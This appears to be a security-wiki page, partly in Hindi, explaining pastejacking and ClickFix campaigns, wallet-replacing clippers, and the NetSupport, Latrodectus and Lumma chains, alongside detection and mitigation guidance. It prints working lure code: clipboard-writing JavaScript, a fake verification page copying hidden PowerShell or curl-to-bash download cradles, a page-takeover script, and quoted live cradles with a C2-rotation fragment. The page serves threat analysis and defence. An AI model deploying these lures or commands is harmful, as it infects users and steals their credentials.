# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – पुरानी लेकिन अभी भी मान्य सलाह

## Overview

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता अक्सर commands को बिना जांचे copy-and-paste करते हैं। एक malicious web page (या कोई भी JavaScript-capable context जैसे Electron या Desktop application) programmatically attacker-controlled text को system clipboard में डाल देती है। victims को, आमतौर पर carefully crafted social-engineering instructions के जरिए, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने, या terminal खोलकर clipboard content *paste* करने के लिए प्रेरित किया जाता है, जिससे तुरंत arbitrary commands execute हो जाते हैं।

क्योंकि **कोई file download नहीं होती और कोई attachment open नहीं होता**, यह technique attachments, macros या direct command execution की निगरानी करने वाले अधिकांश e-mail और web-content security controls को bypass कर देती है। इसलिए यह attack phishing campaigns में लोकप्रिय है, जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसी commodity malware families deliver करती हैं।

## Wallet-address replacement clippers

एक और **clipboard hijacking** variant commands paste नहीं करता: यह तब तक इंतजार करता है जब तक victim एक **cryptocurrency wallet address** copy न करे, फिर paste से ठीक पहले उसे silently attacker-controlled address से बदल देता है। यह लंबे wallet formats के खिलाफ विशेष रूप से प्रभावी है क्योंकि users अक्सर सिर्फ पहले/आखिरी characters verify करते हैं।

Common real-world traits:
- **Thin loader + nested payload**: visible app/exe एक legitimate trading या "profit" tool जैसा दिखता है, जबकि real clipper bundle में और गहराई में छिपा होता है (उदाहरण के लिए एक .NET loader जो nested Rust payload launch करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, या यहां तक कि generic **44-character Solana-like** strings जैसी strings को match करता है और उन्हें attacker wallets से rewrite कर देता है।
- **Wallet rotation at scale**: modern Windows samples एक single static address के बजाय प्रति currency **हजारों** replacement wallets embed कर सकते हैं, जिससे हर theft के बाद wallet reputation burn कम होता है।

### Windows clipper flow

A common implementation is a hidden window registered with **`AddClipboardFormatListener`**. On each clipboard update, the malware typically calls:
- **`OpenClipboard`** → current clipboard data access करता है।
- **`GetClipboardData`** → text read करता है।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker value से replace करता है।

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
यूज़र-लेवल persistence प्रभाव के लिए पर्याप्त है। एक देखे गए pattern में:
- payload को **`%APPDATA%\silke\silke.exe`** में copy करना
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के अंदर एक **Startup-folder LNK** बनाना

Detection ideas:
- वे processes जो clipboard APIs को लगातार call करते हैं और साथ ही `%APPDATA%` तथा user **Startup** folder में write भी करते हैं।
- नए LNK/executable creation के बाद wallet-address clipboard rewrites।
- Archives या fake-software bundles जिनमें बहुत सारी unused files हों और साथ में एक छोटा launcher हो जो nested binary को start करता हो।

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS पर, कुछ campaigns एक **`unlocker.command`** helper ship करते हैं और victim को निर्देश देते हैं कि अगर Gatekeeper कहे कि app damaged है या unidentified developer से है, तो right-click → **Open** करें। script बस quarantine हटाता है और पास वाली `.app` को launch करता है:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने campaigns `document.execCommand('copy')` का उपयोग करते थे, नए ones asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।

## The ClickFix / ClearFake Flow

1. User एक typosquatted या compromised site पर जाता है (e.g. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript `unsecuredCopyToClipboard()` helper को call करता है, जो चुपचाप clipboard में Base64-encoded PowerShell one-liner store करता है।
3. HTML instructions victim को बताते हैं: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` execute होता है, एक archive download करता है जिसमें एक legitimate executable plus एक malicious DLL होती है (classic DLL sideloading)।
5. Loader additional stages decrypt करता है, shellcode inject करता है और persistence install करता है (e.g. scheduled task) – ultimately NetSupport RAT / Latrodectus / Lumma Stealer run करता है।

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` खोजता है।
* malicious DLL **GetProcAddress** के साथ APIs को dynamically resolve करता है, **curl.exe** के जरिए दो binaries (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करता है, final shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को execute करता है
3. MSI payload fetch करता है → एक signed application के साथ `libcef.dll` drop करता है → DLL sideloading → shellcode → Latrodectus.

### MSHTA के माध्यम से Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** कॉल एक छिपी हुई PowerShell script लॉन्च करती है जो `PartyContinued.exe` को retrieve करती है, `Boat.pst` (CAB) निकालती है, `extrac32` और file concatenation के जरिए `AutoIt3.exe` को reconstruct करती है, और अंत में एक `.a3x` script चलाती है जो browser credentials को `sumeriavgv.digital` पर exfiltrate करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns file downloads को पूरी तरह skip करते हैं और victims को एक one-liner paste करने के लिए instruct करते हैं जो WSH के जरिए JavaScript fetch और execute करता है, उसे persist करता है, और C2 को daily rotate करता है। Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर उल्टा किया जाता है ताकि सामान्य inspection को मात दी जा सके।
- JavaScript एक Startup LNK (WScript/CScript) के जरिए खुद को persist करता है, और current day के आधार पर C2 चुनता है – जिससे domain rotation तेज़ी से हो पाती है।

C2s को date के अनुसार rotate करने के लिए इस्तेमाल किया गया minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला stage आम तौर पर एक loader deploy करता है जो persistence स्थापित करता है और एक RAT (उदा., PureHVNC) pull करता है, अक्सर TLS को hardcoded certificate पर pin करता है और traffic को chunk करता है।

इस variant के लिए specific detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में LNK जो `%TEMP%`/`%APPDATA%` के तहत JS path के साथ WScript/CScript invoke करता है।
- Registry/RunMRU और command-line telemetry जिसमें `.split('').reverse().join('')` या `eval(a.responseText)` शामिल हो।
- बार-बार `powershell -NoProfile -NonInteractive -Command -` with बड़े stdin payloads, ताकि long command lines के बिना लंबे scripts feed किए जा सकें।
- Scheduled Tasks जो बाद में ऐसे LOLBins execute करते हैं जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` किसी updater-जैसे task/path के तहत (उदा., `\GoogleSystem\GoogleUpdater`)।

Threat hunting
- Daily-rotating C2 hostnames और URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Clipboard write events को Win+R paste के बाद तुरंत `powershell.exe` execution के साथ correlate करें।


Blue-teams clipboard, process-creation और registry telemetry को combine करके pastejacking abuse pinpoint कर सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** commands का history रखता है – unusual Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders में file creations के लिए, suspicious 4688 event से ठीक पहले।
* EDR clipboard sensors (अगर present हों) – `Clipboard Write` को तुरंत एक नए PowerShell process के साथ correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) जो users को अपने clipboard से OS-specific commands native consoles में copy करने के लिए मजबूर करते हैं। इससे execution browser sandbox से बाहर pivot हो जाता है और Windows तथा macOS दोनों पर काम करता है।

Builder-generated pages की key traits
- OS detection via `navigator.userAgent` ताकि payloads tailor हों (Windows PowerShell/CMD vs. macOS Terminal). Unsupported OS के लिए optional decoys/no-ops illusion बनाए रखने के लिए।
- Benign UI actions (checkbox/Copy) पर automatic clipboard-copy, जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation और single-file injector जो compromised site के DOM को Tailwind-styled verification UI से overwrite करता है (कोई नया domain registration required नहीं)।

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS initial run की persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का उपयोग करें ताकि execution terminal बंद होने के बाद भी जारी रहे, जिससे visible artifacts कम हों।

compromised sites पर in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr) and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) to pull current lure logic. Recent overlays heavily use fake CAPTCHAs that instruct users to copy/paste a one-liner (T1204.004) instead of downloading anything.
- Initial execution is increasingly delegated to signed script hosts/LOLBAS. January 2026 chains swapped earlier `mshta` usage for the built-in `SyncAppvPublishingServer.vbs` executed via `WScript.exe`, passing PowerShell-like arguments with aliases/wildcards to fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` पर साइन किया गया है और आमतौर पर App-V द्वारा उपयोग किया जाता है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ मिलकर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है।
- फरवरी 2026 के fake CAPTCHA payloads फिर से pure PowerShell download cradles पर शिफ्ट हो गए। दो live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
